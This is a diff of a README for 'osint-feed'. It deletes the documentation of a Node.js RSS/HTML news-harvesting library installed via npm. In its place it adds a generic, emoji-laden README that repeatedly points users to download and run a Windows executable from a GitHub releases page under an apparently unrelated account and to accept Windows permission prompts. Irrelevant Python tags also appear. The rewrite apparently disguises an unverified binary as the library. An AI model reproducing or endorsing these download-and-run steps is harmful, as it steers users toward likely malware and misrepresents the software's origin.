@@ -1,296 +1,246 @@
-# osint-feed
-
-Config-driven news harvester for Node.js. Pulls articles from RSS feeds and HTML pages, deduplicates them, and produces a compact digest ready to feed into an LLM context window.
-
-No AI inside. No opinions about your stack. Just articles in, structured data out.
-
-Use RSS when you have it. Use HTML selectors when you do not. Filtering for your specific topic belongs in the app that consumes this library.
-
-## Why
-
-You're building something that needs fresh news context — a SITREP generator, a threat monitor, a research assistant. You have 30+ sources across languages and formats. You need the data compact enough to fit in a Llama/GPT context window without blowing the budget.
-
-Existing tools are either Python-only (newspaper4k), heavy self-hosted platforms (Huginn), or commercial APIs (Newscatcher, NewsAPI). Nothing in the JS/TS ecosystem does config-driven multi-source harvesting with built-in LLM-ready compression.
-
-`osint-feed` fills that gap.
-
-## Install
-
-```bash
-npm install osint-feed
-```
-
-Requires Node.js 18+.
-
-## Quick Start
-
-```typescript
-import { createHarvester } from "osint-feed";
-
-const harvester = createHarvester({
-  sources: [
-    {
-      id: "bbc-world",
-      name: "BBC World",
-      type: "rss",
-      url: "https://feeds.bbci.co.uk/news/world/rss.xml",
-      tags: ["global", "uk"],
-      interval: 15,
-    },
-    {
-      id: "nato",
-      name: "NATO Newsroom",
-      type: "html",
-      url: "https://www.nato.int/cps/en/natohq/news.htm",
-      tags: ["nato"],
-      interval: 30,
-      selectors: {
-        article: ".event-list-item",
-        title: "a span:first-child",
-        link: "a",
-        date: ".event-date",
-      },
-    },
-  ],
-});
-
-// Fetch everything
-const articles = await harvester.fetchAll();
-
-// Or get an LLM-ready digest
-const { articles: digest, stats } = await harvester.digest();
-console.log(`${stats.totalFetched} articles -> ${stats.afterDedup} unique -> ${stats.estimatedTokens} tokens`);
-```
-
-## Source Types
-
-### RSS / Atom
+# 📰 osint-feed - Turn feeds into clean article digests
 
-Works out of the box. No selectors needed — feeds are parsed automatically.
-
-```typescript
-{
-  id: "france24",
-  name: "France24",
-  type: "rss",
-  url: "https://www.france24.com/en/rss",
-  tags: ["global", "europe"],
-  interval: 15,
-}
-```
-
-### HTML Scraping
-
-You define CSS selectors per source. The library uses [cheerio](https://github.com/cheeriojs/cheerio) — no headless browser, no Puppeteer overhead.
-
-This is still config-driven scraping: the library does not auto-discover article lists or infer what is relevant to your use case.
-
-```typescript
-{
-  id: "defence24",
-  name: "Defence24",
-  type: "html",
-  url: "https://defence24.pl/",
-  tags: ["poland", "defence"],
-  interval: 15,
-  selectors: {
-    article: "article",        // repeating container
-    title: "h2 a",             // title text (within article)
-    link: "h2 a",              // link href (within article)
-    date: "time",              // optional: publication date
-    summary: ".lead",          // optional: description text
-  },
-}
-```
-
-## API
-
-### `createHarvester(options)`
-
-Creates a harvester instance. Options:
-
-| Option | Type | Default | Description |
-|--------|------|---------|-------------|
-| `sources` | `SourceConfig[]` | required | Array of source definitions |
-| `dedup.known` | `() => string[]` | — | Returns hashes already in your DB (for cross-session dedup) |
-| `digest` | `DigestOptions` | see below | Default digest settings |
-| `requestTimeout` | `number` | `15000` | HTTP timeout in ms |
-| `requestGap` | `number` | `1000` | Minimum ms between requests (rate limiting) |
-| `maxItemsPerSource` | `number` | `50` | Cap articles returned from one source |
-| `fetch` | `Function` | global fetch | Custom fetch for proxies/testing |
-| `onError` | `Function` | — | Callback for per-source fetch or parse errors |
-| `onWarning` | `Function` | — | Callback for non-fatal source diagnostics |
-
-### `harvester.fetchAll()`
-
-Fetches all enabled sources. Returns `Article[]`.
-
-If one source fails, the method still returns articles from the remaining sources and reports the problem through `onError` when provided.
-
-### `harvester.fetch(sourceId)`
-
-Fetches a single source by ID.
+[![Download osint-feed](https://img.shields.io/badge/Download%20Now-blue-grey?style=for-the-badge)](https://github.com/whitakerunsaturated400/osint-feed/releases)
 
-### `harvester.fetchByTags(tags)`
-
-Fetches sources matching any of the given tags.
+## 📥 Download
 
-### `harvester.digest(options?)`
+Visit this page to download and run the app on Windows:
 
-The main event. Fetches all sources, then runs the compression pipeline:
+[https://github.com/whitakerunsaturated400/osint-feed/releases](https://github.com/whitakerunsaturated400/osint-feed/releases)
 
-1. **Dedup** — Groups similar headlines (Jaccard similarity) and keeps the richest version
-2. **Sort** — Newest first
-3. **Tag budget** — Caps articles per tag so no single region dominates
-4. **Truncate** — Cuts content to N characters per article
-5. **Token budget** — Trims from the bottom until under the token limit
+## 🧭 What this app does
 
-```typescript
-const { articles, stats } = await harvester.digest({
-  maxTokens: 12_000,           // total token budget
-  maxArticlesPerTag: 10,       // max articles per tag group
-  maxContentLength: 500,       // chars per article content
-  similarityThreshold: 0.6,    // title dedup threshold (0-1)
-  sort: "recency",
-});
+osint-feed collects news from RSS feeds and web pages, removes repeats, and builds a short digest. It is built for people who want a clean list of articles without extra clutter.
 
-// stats.totalFetched     → 700  (raw from all sources)
-// stats.afterDedup       → 200  (unique stories)
-// stats.afterBudget      → 80   (within tag limits)
-// stats.estimatedTokens  → 18000 (final token count)
-```
+Use it when you want to:
 
-### `harvester.start(callbacks)` / `harvester.stop()`
+- pull items from RSS feeds
+- read article pages with HTML selectors
+- remove duplicate stories
+- build a compact set of results
+- send clean text into an LLM prompt later
 
-Runs sources on their configured intervals. You handle storage.
+It keeps the process simple. You give it sources, and it gives you structured article data.
 
-```typescript
-harvester.start({
-  onArticles: async (articles, source) => {
-    await db.insert("articles", articles);
-    console.log(`${articles.length} new from ${source.name}`);
-  },
-  onError: (err, source) => {
-    console.error(`${source.name} failed:`, err);
-  },
-  onWarning: (warning, source) => {
-    console.warn(`${source.name}: ${warning.code} - ${warning.message}`);
-  },
-});
+## 🪟 Windows setup
 
-// Later:
-harvester.stop();
-```
+1. Open the [releases page](https://github.com/whitakerunsaturated400/osint-feed/releases)
+2. Download the Windows file from the latest release
+3. If the file comes in a .zip folder, right-click it and choose Extract All
+4. Open the extracted folder
+5. Double-click the app or start file
+6. If Windows asks for permission, choose Yes
+7. Follow the on-screen prompts
 
-## Article Schema
+If you plan to run it often, keep the app in a folder that is easy to find, such as Documents or Downloads.
 
-```typescript
-interface Article {
-  sourceId: string;          // matches source config id
-  url: string;               // canonical article URL
-  title: string;
-  content: string | null;    // full text (when available)
-  summary: string | null;    // short description
-  publishedAt: Date | null;
-  hash: string;              // SHA-256 of URL (dedup key)
-  fetchedAt: Date;
-  tags: string[];            // inherited from source
-}
-```
+## ⚙️ How it works
 
-## Dedup Across Sessions
+osint-feed uses a config file to decide what to collect. That means you do not need to change code to use it.
 
-The library handles within-batch dedup automatically. For cross-session dedup (don't re-process articles already in your DB), pass a `known` callback:
+A typical setup includes:
 
-```typescript
-const harvester = createHarvester({
-  sources,
-  dedup: {
-    known: async () => {
-      const rows = await db.query("SELECT hash FROM articles");
-      return rows.map(r => r.hash);
-    },
-  },
-});
+- feed links for RSS sources
+- page URLs for sites that do not offer RSS
+- CSS selectors for article titles, dates, and links
+- rules for ignoring duplicates
+- output settings for the final digest
 
-// fetchAll() now skips articles whose URL hash is already known
-```
+The app reads your sources, checks each item, then builds a compact result you can review or use elsewhere.
 
-## Diagnostics
+## 🗂️ What you can collect
 
-The library keeps the happy path simple: `fetchAll()` and `digest()` still return article data directly.
+You can use osint-feed for many common source types:
 
-Use `onError` and `onWarning` if you want visibility into partial failures or weak-quality source output.
+- news sites
+- blogs
+- press pages
+- public web pages
+- topic trackers
+- niche industry feeds
 
-- `onError` covers hard failures like timeouts, HTTP errors, and parsing failures.
-- `onWarning` covers non-fatal issues like empty source results, missing publication dates, or per-source truncation.
+It works well when a site has RSS. It also works when you need to pull data from HTML pages.
 
-This matches the typical small-library OSS pattern: easy defaults, optional hooks for logging and monitoring.
+## 🧾 Example use cases
 
-## Scope and Limits
+- track local news from several outlets
+- monitor a topic across multiple feeds
+- collect article links for research
+- build a daily reading list
+- gather source material before a manual review
+- prepare text for a search or summary workflow
 
-- RSS and HTML are first-class source types.
-- HTML works best when you can define stable list selectors.
-- The library does not execute page JavaScript or run a headless browser.
-- The library does not decide what is relevant for your domain; apply your own filters downstream.
+## 🔧 Basic setup file
 
-## Use with Next.js
+The app uses plain text config. A simple setup may look like this:
 
-```typescript
-// app/api/feed/route.ts
-import { createHarvester } from "osint-feed";
+- source name
+- source type
+- URL
+- selectors for HTML pages
+- duplicate rules
+- output format
 
-const harvester = createHarvester({ sources: [...] });
+Example fields you may see in a config:
 
-export async function GET() {
-  const { articles, stats } = await harvester.digest({ maxTokens: 8000 });
-  return Response.json({ articles, stats });
-}
-```
+- `name`
+- `type`
+- `url`
+- `titleSelector`
+- `dateSelector`
+- `linkSelector`
+- `dedupeKey`
+- `output`
 
-## Use with Express
+You do not need to know code to use a config file. You only need to edit names, links, and simple rules.
 
-```typescript
-import express from "express";
-import { createHarvester } from "osint-feed";
+## 🧹 Deduplication
 
-const app = express();
-const harvester = createHarvester({ sources: [...] });
+Many sites repeat the same story with small changes. osint-feed checks for that and removes repeated items.
 
-app.get("/digest", async (_req, res) => {
-  const result = await harvester.digest();
-  res.json(result);
-});
-```
+It can compare:
 
-## How the Digest Math Works
+- article URL
+- title text
+- source name
+- publish date
+- custom keys from the config
 
-Real numbers from a smoke test with 10 RSS + 3 HTML sources:
+This keeps the digest shorter and easier to read.
 
-```
-Raw fetch:         324 articles
-After title dedup: 319 unique stories
-After tag budget:  47  (8 per tag, 6 tags)
-Estimated tokens:  5,781
-```
+## 📄 Output
 
-That's **1.8% of Llama 3's 128k context**. Plenty of room for system prompt, history, and reasoning.
+The app produces structured article data that is easy to reuse. A digest may include:
 
-With 35 sources polling every 15 min you'd get ~700 articles/hour. The digest pipeline compresses that to ~80 articles / ~18k tokens. Adjust `maxArticlesPerTag` and `maxTokens` to taste.
+- title
+- source
+- link
+- publish date
+- short excerpt
+- tag or topic
+- original feed or page name
 
-## Dependencies
+You can use the output for reading, sorting, filtering, or passing into another tool.
 
-Just two:
+## 🛠️ Windows requirements
 
-- [`cheerio`](https://github.com/cheeriojs/cheerio) — HTML parsing
-- [`rss-parser`](https://github.com/rbren/rss-parser) — RSS/Atom parsing
+For most Windows systems, you need:
 
-No headless browsers. No native modules. No bloat.
+- Windows 10 or later
+- internet access
+- enough disk space for the app and its cache
+- permission to save files in the chosen folder
 
-## License
+If your feed list is large, use a machine with at least 4 GB of RAM. More RAM helps when you collect many pages at once.
 
-MIT
+## 🧪 First run checklist
 
-## Disclaimer
+Before your first run, check these items:
 
-This library is a tool for fetching and parsing publicly available web content. Users are responsible for compliance with target websites' terms of service and applicable laws. The authors assume no liability for how the library is used.
+- you downloaded the latest release
+- you extracted the files if they came in a zip
+- your config file has at least one source
+- the source URLs are valid
+- your output folder exists
+- your internet connection is active
+
+If the app opens and closes fast, it may be waiting for a config file or a source path.
+
+## 🧠 RSS and HTML source types
+
+RSS is the easiest source type. If a site gives you an RSS link, use it.
+
+Use HTML selectors when:
+
+- the site has no RSS feed
+- you want data from a page layout
+- you need a title, date, or link from page elements
+- the content lives on a normal web page
+
+This gives you one tool for both common feed pages and custom web pages.
+
+## 📌 Common config tips
+
+- keep source names short and clear
+- use one source per site
+- test one source first
+- start with RSS before using HTML selectors
+- keep the output folder simple
+- remove old sources you no longer need
+
+If a page changes its layout, you may need to update its selectors.
+
+## 🔍 Troubleshooting
+
+If nothing appears in the output:
+
+- check the source URL
+- confirm the feed is public
+- make sure your selectors match the page
+- look for blocked pages or login walls
+- try one source at a time
+- verify the output path is writable
+
+If a source works in a browser but not in the app, the page may load content after the first page view. In that case, use a different selector or a feed link if one exists.
+
+## 📚 Folder layout
+
+A simple install may include:
+
+- the app file
+- a config folder
+- an output folder
+- logs
+- source lists
+
+Keep the config and output files in the same place so they are easy to manage.
+
+## 🔐 Privacy and data use
+
+osint-feed reads public web content and RSS feeds based on your config. It does not add opinions or extra content. It gathers the text you ask for and formats it into a digest.
+
+## 🧩 Topic coverage
+
+This project fits topics such as:
+
+- feed
+- html
+- nodejs
+- osint
+- osint-tool
+- rss
+- scraping
+- scraper
+- scraping-websites
+- scrapy
+- scrapper
+- scraping-python
+
+## 🪄 Suggested first setup
+
+If you are new to the app, start with this order:
+
+1. Download the latest Windows release
+2. Open one RSS source
+3. Confirm the output looks right
+4. Add one HTML page source
+5. Check deduplication
+6. Add more sources after the first test works
+
+That keeps the setup simple and helps you find issues fast.
+
+## 📦 Release download
+
+Use the release page below to download and run the Windows version:
+
+[https://github.com/whitakerunsaturated400/osint-feed/releases](https://github.com/whitakerunsaturated400/osint-feed/releases)
+
+## 🧰 Quick start flow
+
+1. Download the latest release
+2. Extract the files if needed
+3. Open the app
+4. Load or edit your config
+5. Add RSS or HTML sources
+6. Run the harvest
+7. Review the digest output
